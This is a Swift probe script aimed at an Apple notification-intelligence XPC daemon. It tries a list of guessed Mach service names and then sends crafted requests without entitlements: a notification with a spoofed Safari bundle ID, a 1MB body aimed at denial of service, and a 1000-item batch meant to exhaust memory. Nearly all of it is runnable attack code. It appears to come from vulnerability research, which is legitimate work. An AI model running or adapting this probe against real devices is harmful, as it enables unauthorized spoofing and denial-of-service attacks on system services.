// Priority Notifications / Notification Intelligence XPC Probe
// Target: The daemon that classifies notifications for Apple Intelligence Priority Notifications
//
// Attack surface:
//   - Every app notification passes through this ML pipeline
//   - Process runs OUTSIDE app sandboxes with system-level access
//   - New feature in iOS 18.4 / macOS 15.x — brand new code
//   - Accepts content from untrusted apps; processes it with ML model
//
// What we test:
//   1. Which Mach service name is used?
//   2. Can we call classification without the entitlement?
//   3. Can we cause DoS via malformed / oversized notification content?
//   4. Does it accept arbitrary notification content from any process?

import Foundation
import UserNotifications

// Guessed protocol — actual method names derived from binary analysis in step 1.
// We test conservative names matching Apple's notification service patterns.
@objc protocol NotificationIntelligenceProtocol: NSObjectProtocol {
    @objc optional func classifyNotification(_ content: NSDictionary?,
                                              reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func prioritizeNotification(_ notification: NSDictionary?,
                                               bundleID: String?,
                                               reply: ((Int, NSError?) -> Void)?)
    @objc optional func requestPriorityScore(_ content: NSDictionary?,
                                             reply: ((Double, NSError?) -> Void)?)
    @objc optional func summarizeNotifications(_ notifications: NSArray?,
                                               reply: ((NSString?, NSError?) -> Void)?)
    @objc optional func getServiceStatus(_ reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func ping(_ reply: ((Bool, NSError?) -> Void)?)
}

let SERVICE_CANDIDATES = [
    "com.apple.notificationintelligence",
    "com.apple.NotificationIntelligence",
    "com.apple.notificationintelligenced",
    "com.apple.intelligence.notifications",
    "com.apple.usernotifications.intelligence",
    "com.apple.UserNotifications.intelligence",
    "com.apple.prioritynotifications",
    "com.apple.PriorityNotifications",
    "com.apple.notificationcenter.intelligence",
    "com.apple.notificationd.intelligence",
    "com.apple.intelligenced",
    "com.apple.siri.notificationintelligence",
    "com.apple.AIRuntime.notifications",
]

func probeNotificationService(_ serviceName: String) {
    print("\n--- Probing: \(serviceName) ---")
    let conn = NSXPCConnection(machServiceName: serviceName, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: NotificationIntelligenceProtocol.self)

    var result = "(pending)"
    let sema = DispatchSemaphore(value: 0)

    conn.invalidationHandler = {
        if result == "(pending)" { result = "INVALIDATED" }
        sema.signal()
    }
    conn.interruptionHandler = {
        if result == "(pending)" { result = "INTERRUPTED" }
        sema.signal()
    }
    conn.resume()

    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        result = "ERROR: \(err.localizedDescription)"
        sema.signal()
    } as? NotificationIntelligenceProtocol

    guard let p = proxy else {
        print("  RESULT: No proxy")
        conn.invalidate()
        return
    }

    p.ping? { _, _ in
        result = "REPLY: ping accepted — service exists and accepted unprivileged connection"
        sema.signal()
    }

    if sema.wait(timeout: .now() + 3) == .timedOut {
        result = "TIMEOUT (3s) *** SERVICE MAY EXIST — no rejection at connect ***"
    }
    print("  ping RESULT: \(result)")

    if result.contains("TIMEOUT") || result.contains("REPLY") {
        print("  ** SERVICE ACTIVE — probing classification methods **")

        // Test: classifyNotification with a crafted payload
        let sema2 = DispatchSemaphore(value: 0)
        var r2 = "(pending)"
        let payload: NSDictionary = [
            "title": "Test notification title",
            "body": "Test notification body from attacker-controlled process",
            "bundleID": "com.apple.Safari",  // spoofed bundle ID
            "timestamp": Date().timeIntervalSince1970,
        ]
        p.classifyNotification?(payload) { _, _ in
            r2 = "REPLY: classifyNotification accepted spoofed bundle ID notification"
            sema2.signal()
        }
        if sema2.wait(timeout: .now() + 8) == .timedOut {
            r2 = "TIMEOUT (8s) — classifyNotification accepted"
        }
        print("  classifyNotification: \(r2)")

        // Test: DoS via oversized notification content
        let sema3 = DispatchSemaphore(value: 0)
        var r3 = "(pending)"
        let bigBody = String(repeating: "A", count: 1_000_000)  // 1MB body
        let bigPayload: NSDictionary = [
            "title": "Oversized notification",
            "body": bigBody,
            "bundleID": "com.test.dos",
        ]
        p.classifyNotification?(bigPayload) { _, _ in
            r3 = "REPLY: classifyNotification accepted 1MB body (no size limit)"
            sema3.signal()
        }
        if sema3.wait(timeout: .now() + 10) == .timedOut {
            r3 = "TIMEOUT (10s) — 1MB body accepted or daemon is processing"
        }
        print("  classifyNotification(1MB body): \(r3)")

        // Test: summarize a batch of notifications (memory exhaustion vector)
        let sema4 = DispatchSemaphore(value: 0)
        var r4 = "(pending)"
        let manyNotifs = NSMutableArray()
        for i in 0..<1000 {
            manyNotifs.add(["title": "Notification \(i)", "body": "Body \(i)", "bundleID": "com.test.batch"] as NSDictionary)
        }
        p.summarizeNotifications?(manyNotifs) { _, _ in
            r4 = "REPLY: summarizeNotifications accepted 1000-item batch"
            sema4.signal()
        }
        if sema4.wait(timeout: .now() + 15) == .timedOut {
            r4 = "TIMEOUT (15s) — 1000-notification batch accepted"
        }
        print("  summarizeNotifications(1000 items): \(r4)")
    }

    conn.invalidate()
    Thread.sleep(forTimeInterval: 1.0)
}

print("=== Notification Intelligence XPC Probe ===")
print("PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())")
print("Testing \(SERVICE_CANDIDATES.count) candidate service names...\n")

for name in SERVICE_CANDIDATES {
    probeNotificationService(name)
}

print("\n=== PROBE COMPLETE ===")
